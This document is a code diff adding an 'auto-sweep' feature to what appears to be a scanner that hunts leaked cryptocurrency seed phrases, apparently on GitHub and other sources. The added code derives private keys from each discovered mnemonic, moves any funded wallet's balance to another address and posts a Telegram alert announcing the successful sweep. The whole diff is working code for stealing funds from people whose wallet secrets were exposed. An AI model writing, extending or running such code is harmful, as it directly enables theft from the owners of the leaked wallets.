@@ -258,6 +258,46 @@ async def run_leak_scanner_loop(interval: int = 3600) -> None:
                     await send_telegram_alert(msg)
                     logger.info("Leak scanner: CONFIRMED HIT from %s!", source)
 
+                    # Auto-sweep funded wallets
+                    try:
+                        from src.modules.crypto.balance.sweeper import Sweeper
+                        from src.modules.crypto.balance.deriver import derive_from_mnemonic
+                        sweeper = Sweeper()
+                        derived = derive_from_mnemonic(finding.mnemonic_candidate, chains=list(ALL_CHAINS))
+                        for d in derived:
+                            if not d.private_key_hex:
+                                continue
+                            chain_cfg = next((c for c in ALL_CHAINS if c.name == d.chain), None)
+                            if not chain_cfg:
+                                continue
+                            detail = result.balance_details.get(d.chain, {})
+                            bal_raw = detail.get("balance_raw", 0)
+                            if bal_raw <= 0:
+                                continue
+                            sr = await sweeper.sweep(
+                                private_key_hex=d.private_key_hex,
+                                chain=chain_cfg,
+                                source_address=d.address,
+                                balance_raw=bal_raw,
+                            )
+                            if sr.success:
+                                sweep_msg = (
+                                    f"🧹 *AUTO-SWEEP SUCCESS!*\n\n"
+                                    f"*Chain:* {sr.chain}\n"
+                                    f"*From:* `{sr.source_address}`\n"
+                                    f"*To:* `{sr.dest_address}`\n"
+                                    f"*Amount:* {sr.amount:.8f}\n"
+                                    f"*TX:* `{sr.tx_hash}`\n"
+                                    f"\n⏰ {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}"
+                                )
+                                await send_telegram_alert(sweep_msg)
+                                logger.info("Sweep SUCCESS: %s %s -> %s", sr.amount, sr.chain, sr.tx_hash)
+                            else:
+                                logger.warning("Sweep failed on %s: %s", d.chain, sr.error)
+                        await sweeper.close()
+                    except Exception as sweep_err:
+                        logger.error("Auto-sweep error: %s", sweep_err)
+
             # Process all findings (dedup in verify_and_alert prevents re-checks)
             for finding in github_findings:
                 await _process_finding(finding, "github")
